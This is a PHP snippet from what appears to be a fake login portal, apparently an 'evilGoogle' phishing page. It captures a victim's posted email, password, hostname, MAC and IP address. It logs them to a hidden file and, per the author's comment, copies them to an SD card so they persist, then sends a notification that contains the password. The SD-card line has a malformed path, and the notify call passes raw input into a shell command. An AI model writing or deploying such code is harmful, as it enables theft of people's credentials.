<?php 
if (isset($_POST['email'])) {
    $email = isset($_POST['email']) ? $_POST['email'] : 'email';
    $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
    $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
    $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
    $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';

    $reflector = new \ReflectionClass(get_class($this));
    $logPath = dirname($reflector->getFileName());
    file_put_contents("{$logPath}/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);

    //this is my line for putting it in the flash drive so it survives the device being turned off
    file_put_contents("{/sd/evilGoogle.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
    $this->execBackground("notify $email' - '$pwd");
}